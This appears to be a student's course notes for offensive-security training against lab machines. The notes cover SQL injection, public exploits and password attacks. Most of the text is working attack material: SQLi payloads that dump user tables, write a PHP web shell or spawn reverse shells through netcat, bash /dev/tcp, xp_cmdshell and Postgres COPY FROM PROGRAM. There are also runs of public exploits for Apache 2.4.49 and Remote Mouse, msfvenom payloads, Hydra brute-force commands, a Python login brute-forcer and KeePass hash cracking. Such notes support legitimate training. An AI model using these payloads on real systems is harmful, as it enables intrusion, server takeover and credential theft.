# Week 3

## SQL injection

Testing for SQLi:
`offsec' OR 1=1 -- //` 
Getting the version:
`' or 1=1 in (select @@version) -- //`

Trying to log in:
`' OR 1=1; -- //`
`' or 1=1 -- //`
`' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`



Information gathering with `UNION`:
`' UNION SELECT 1,2,3 -- //`
`' UNION SELECT 1,2,3,4 -- //`
`' UNION SELECT 1,2,3,4,5 -- //`
etc to determine the number of columns, or use `ORDER BY`:
`' ORDER BY 1 -- //`
`' ORDER BY 2 -- //`
`' ORDER BY 3 -- //`

determine which columns are displayed using the following query.

`%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //`

Then we can use the info to get the first attack:
`%' UNION SELECT database(), user(), @@version, null, null -- //`

### Enumerating tables and columns
`%' UNION SELECT table_name, column_name, null, null, null FROM information_schema.columns`

`' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`

If you find a users table you can dump it using 
`' UNION SELECT null, username, password, description, null FROM users -- //`

But what if the output only allows one row? You can use `GROUP_CONCAT` to combine the results into one row:
`' UNION SELECT null, GROUP_CONCAT(username, ':', password), null, null, null FROM users -- //`

Or you can use `LIMIT` to get the first row, then the second row, etc:
`' UNION SELECT null, username, password, description, null FROM users LIMIT 0,1 -- //`
`' UNION SELECT null, username, password, description, null FROM users LIMIT 1,1 -- //`

### Blind SQLi
If the output is not displayed, you can use blind SQLi to enumerate the database. You can use `IF` statements to check for certain conditions and use the response to infer information about the database.
Using time with a `sleep()` function to check for conditions:
`' AND IF(1=1, SLEEP(5), 0) -- //`
`' AND IF(1=2, SLEEP(5), 0) -- //`

This is very slow, so better to use automation.


### Getting a shell using SQL

Mysql allows execute commands using `SELECT ... INTO OUTFILE` to write files to the server. You can use this to write a web shell to the server if you have write access to the web root.

Very basic shell: `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`

Then you can access the shell by visiting `http://target/tmp/webshell.php?cmd=whoami` to execute commands on the server.

MSSQL allows executing commands using `xp_cmdshell` if it is enabled. You can use this to execute commands on the server.

`' ; EXEC xp_cmdshell 'whoami' -- //`
To enable it you can use:
`' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- //`

#### OS-shell manual method
On the host: 
`nc -lvnp 4444`

Postgress:
In Postgres you can use the `COPY .. FROM PROGRAM` command to execute commands on the server. You can use this to get a reverse shell on the server.

`';DROP TABLE IF EXISTS commandexec;CREATE TABLE commandexec(data text);COPY commandexec FROM PROGRAM '/usr/bin/nc.traditional -e /bin/bash 192.168.45.175 4444';--`

Mysql:
In MySQL you can use the `SELECT ... INTO OUTFILE` command to write files to the server. You can use this to write a reverse shell to the server.

`' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //`
Then connect to the shell by visiting `http://target/tmp/webshell.php?cmd=whoami` which you can then use to execute commands on the server. You can use a reverse shell like `bash -c "bash -i >& /dev/tcp/192.168.45.249/4444 0>&1"` 


MSSQL:
As discussed previously, you can use `xp_cmdshell` to execute commands on the server. You can use this to get a reverse shell on the server.
`' ; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'nc -e cmd.exe 192.168.45.175 4444' -- //`

`' ; EXEC xp_cmdshell 'nc -e cmd.exe 192.168.45.175 4444' -- //`


### Automated SQLi
You can use `sqlmap` to automate the process of finding and exploiting SQL injection vulnerabilities.

https://mihneamanolache.github.io/curl-to-sqlmap/ very handy tool to convert curl commands to sqlmap commands.
You can get a curl command from firefox by right clicking on a request in the network tab and selecting "Copy as cURL".

`--os-shell` option can be used to get a shell on the server if the database allows executing commands.

But alas sqlmap is not allowed on the exam, so you will have to do it manually.

## Exploit DB
`searchsploit` is a command line tool that allows you to search for exploits in the Exploit DB database. You can use it to find exploits for specific software or vulnerabilities.

Use the `-m` option to download the exploit to your local machine.
check what languare the exploit is written in and if it is compatible with the target system.

### remote mouse server
`sudo nmap -sS --script="smb*" 192.168.154.10` to enumerate the target
I run the smb scripts because its windows so its probably something related to smb.

```bash
| smb-ls: Volume \\192.168.154.10\Users
|   maxfiles limit reached (10)
| SIZE   TIME                 FILENAME
| <DIR>  2017-03-18T11:40:20  .
| <DIR>  2017-03-18T11:40:20  ..
| <DIR>  2022-06-21T01:06:55  offsec
| <DIR>  2022-06-21T01:07:23  offsec\Contacts
| <DIR>  2022-06-21T01:06:55  offsec\Desktop
| <DIR>  2022-06-21T01:06:55  offsec\Documents
| <DIR>  2022-06-21T01:06:55  offsec\Downloads
| <DIR>  2022-06-21T01:06:55  offsec\Favorites
| <DIR>  2022-06-21T01:06:55  offsec\Links
| <DIR>  2022-06-21T01:06:55  offsec\Music
| 
| 
| Volume \\192.168.154.10\offsec
|   maxfiles limit reached (10)
| SIZE      TIME                 FILENAME
| <DIR>     2022-06-21T01:06:55  .
| <DIR>     2022-06-21T01:06:55  ..
| <DIR>     2022-06-21T01:07:23  Contacts
| <DIR>     2022-06-21T01:06:55  Desktop
| 38        2022-10-11T14:14:44  Desktop\flag.txt
| <DIR>     2022-06-21T01:06:55  Documents
| <DIR>     2022-06-21T01:06:55  Downloads
| 1569243   2022-06-21T21:56:34  Downloads\7z2200-x64.exe
| 49618184  2022-06-21T21:54:23  Downloads\ccsetup601.exe
| 1414600   2022-06-21T21:53:48  Downloads\ChromeSetup.exe
```

Dir listing shows a mouse server
Computer name is `Computer name: remotemouse` so we can search for exploits for this software.
`searchsploit Mouse Server` shows a remote code execution exploit for this software.

`python3 49601.py 192.168.144.10 192.168.45.164 payload.bat` to get a shell

(payload is the powershell -enc <base64> payload from week 2)


### apache httpd 2.4.49 - Path Traversal and RCE (CVE-2021-41773)
start with nmap again to enumerate the target and find the apache version.
```bash
sudo nmap -sV -p - -nP 192.168.144.188
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-11 08:46 EDT
Nmap scan report for 192.168.144.188
Host is up (0.031s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.49 ((Unix))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.38 seconds

```
Apache version is world famous for the path traversal vulnerability, so we can use the exploit from exploit-db to get a shell on the server.

```bash
searchsploit Apache httpd 2.4.49

Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution 
```

Copy the exploit to your local machine and run


`./50383.sh targets.txt /bin/bash 'bash -i >& /dev/tcp/192.168.45.164/4444 0>&1'` to get a shell

### capstone lab exploits

MSF Console can be used to get a shell on the target machine using the exploits we found in the previous section.

`msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"`

Find all files on the target machine using the following command:
`Get-ChildItem -Path C:\ -Recurse -Filter flag.txt -File | Select-Object -ExpandProperty FullName`
use flag.txt


`msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe > shell.exe`

or 
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f elf > shell.elf`
catch the shell 
`nc -nvlp <Your_Port>`


## Password attacks
### Password spraying
THC Hydra is a very fast and flexible password cracking tool that supports many protocols. It can be used to perform password spraying attacks against various services.

`hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201` 

for a password attack against SSH on port 2222 using the username george and the rockyou wordlist.

```bash
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.249.201
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-26 09:33:02
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.249.201:2222/
[2222][ssh] host: 192.168.249.201   login: george   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-26 09:33:12
```                                
Log in with: `ssh -p 2222 george@192.168.249.201`

If you know the password but not the names, find some names to use with the password using a wordlist, put them in a file.
`hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202` 

Hydra supports many protocols, including SSH, RDP, FTP, HTTP, and more. You can use it to perform password attacks against various services.

start your url with `http-get://` for a basic HTTP GET request, or `http-post-form` for a POST request. You can specify the form parameters and the response to look for to determine if the login was successful.
`rdp://` or `ssh://` for RDP or SSH, respectively. You can also specify the port using `-s <port>` if it is not the default port for the protocol.

Post request is a bit finiky, you need to specify the form parameters and the response to look for to determine if the login was successful. You can use Burp Suite to intercept the request and see the parameters and response or use the network tab in your browser's developer tools to see the request and response.

`hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"` 

If you have a session cookie, or a CSRF token, you can use the `-C` option to specify a file containing the cookie or token. You can also use the `-m` option to specify a file containing multiple cookies or tokens.
To get a CSRF token before logging and it changes every request hydra is kinda limited, so its best to make a custom python script to get the token and then use it in the request. You can use the `requests` library in Python to make the request and get the token using beautifulsoup4 to parse the HTML and extract the token. Then you can use the token in the request to log in.
Example of a POST request with a CSRF token:
```python
import requests
from bs4 import BeautifulSoup

# Make a request to the login page
WORDLIST = '/usr/share/wordlists/rockyou.txt'
URL = "http://example.com/login"
USER = "user"

# Read the wordlist
with open(WORDLIST, 'r') as f:
	passwords = f.readlines()
	# create NUM_THREADS threads to try the passwords in parallel
	for password in passwords:
		password = password.strip()

		response = requests.get(URL)

		# Parse the HTML
		soup = BeautifulSoup(response.text, "html.parser")

		# Extract the CSRF token
		csrf_token = soup.find("input", {"name": "csrf_token"})["value"]

		# Make a POST request with the CSRF token and the password
		data = {
			"username": USER,
			"password": password,
			"csrf_token": csrf_token
		}
		response = requests.post(URL, data=data)
		if "Login failed" not in response.text:
			print(f"Password found: {password}")
			print(f"Response code: {response.status_code}")
			print(f"Response: {response.text}")
			break

```		


### Password cracking using Hashcat
Hashcat is a password cracking tool that supports many hashing algorithms. 
Check using `hashid` or `hash-identifier` to identify the hash type, then use `hashcat -H` to get a list of supported hash types. You can use the `-m` option to specify the hash type

`hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force` you can add rules to combine the passwords, or change them. There are some standard rules in `/usr/share/hashcat/rules/` that you can use. popular is the `rockyou-30000.rule` which is a good starting point. You can also use the `--force` option to force hashcat to run even if it detects that your GPU is not supported. You can use the `--status` option to get the status.

#### Find kbdx files for KeePass
`Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue` in powershell or `find / -name "*.kdbx"` in linux to find KeePass database files. You can then use KeePass to open the database file and extract the passwords.
`keepass2john Database.kdbx > keepass.hash` to extract the hash from the KeePass database file. You can then use Hashcat to crack the hash and recover the password, remove the word `Database:` from the hash file before running hashcat. 

Hashcat has a mode: `-m 13400` for KeePass 2.x (AES/KDBX4) and `-m 12500` for KeePass 1.x (SHA-256/KDBX3). You can use the `--force` option to force hashcat to run even if it detects that your GPU is not supported. You can use the `--status` option to get the status.

